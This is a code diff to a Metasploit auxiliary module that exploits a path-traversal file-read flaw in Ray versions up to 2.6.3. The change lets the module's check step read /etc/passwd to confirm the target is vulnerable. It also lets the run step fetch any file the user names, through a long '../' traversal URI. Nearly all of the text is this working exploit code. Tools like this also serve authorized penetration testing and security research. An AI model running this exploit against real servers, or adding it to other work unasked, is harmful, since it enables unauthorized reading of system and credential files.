@@ -57,13 +57,16 @@ class MetasploitModule < Msf::Auxiliary
 
     return Exploit::CheckCode::Safe unless Rex::Version.new(ray_version) <= Rex::Version.new('2.6.3')
 
+    file_content = lfi('/etc/passwd')
+    return Exploit::CheckCode::Vulnerable unless file_content.nil?
+
     return Exploit::CheckCode::Appears
   end
 
-  def lfi
+  def lfi(filepath)
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, "static/js/../../../../../../../../../../../../../..#{datastore['FILEPATH']}")
+      'uri' => normalize_uri(target_uri.path, "static/js/../../../../../../../../../../../../../..#{filepath}")
     })
     return unless res && res.code == 200
 
@@ -71,9 +74,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    @file_content ||= lfi
-    fail_with(Failure::Unknown, 'Failed to execute LFI') unless @file_content
-    print_good("#{datastore['FILEPATH']}\n#{@file_content}")
+    file_content = lfi(datastore['FILEPATH'])
+    fail_with(Failure::Unknown, 'Failed to execute LFI') unless file_content
+    print_good("#{datastore['FILEPATH']}\n#{file_content}")
   end
 
 end
